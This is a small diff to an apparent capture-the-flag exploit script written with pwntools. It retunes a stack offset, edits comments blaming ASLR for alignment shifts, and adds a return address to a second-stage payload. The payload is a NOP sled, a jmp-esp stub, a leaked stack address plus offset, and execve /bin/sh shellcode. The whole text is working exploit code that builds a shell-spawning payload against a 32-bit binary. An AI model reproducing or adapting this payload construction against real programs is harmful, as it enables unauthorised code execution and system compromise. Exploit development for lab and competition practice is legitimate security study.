@@ -33,12 +33,13 @@ elif (len(sys.argv) > 1 and sys.argv[1] == '--debug'):
 entry_point = 0x08048060
 rop_gadget  = 0x08048087
 
-# Stack is going to get realigned by 20 bytes when we send 20 A's
-# but for some reason, the alignment is shifted by some value of
+# Stack pointer is going to get realigned by 20 bytes when we send 20 A's
+# but because of ASLR, the alignment is randomly shifted by some value of
 # [2A, 3A, 4A, 5A, 6A, 7A, 8A, 9A, AA, ..]
 # ESP always ends up as 0xFFFFFF?A and we always need to jump to 0xFFFFFF?4
 # So I guess just chose a random offset
-offset = 0x3A
+# offset = 0x3A
+offset = 0x2B
 
 jmpesp_shellcode = asm('\n'.join([
     'jmp esp',
@@ -82,6 +83,7 @@ def exploit(conn):
     stage2 =  ''
     stage2 += '\x90'*(20-len(jmpesp_shellcode))
     stage2 += jmpesp_shellcode
+    stage2 += p32(0x0804809c)
     stage2 += p32(leak + offset)
     stage2 += execve_bin_sh_shellcode
 
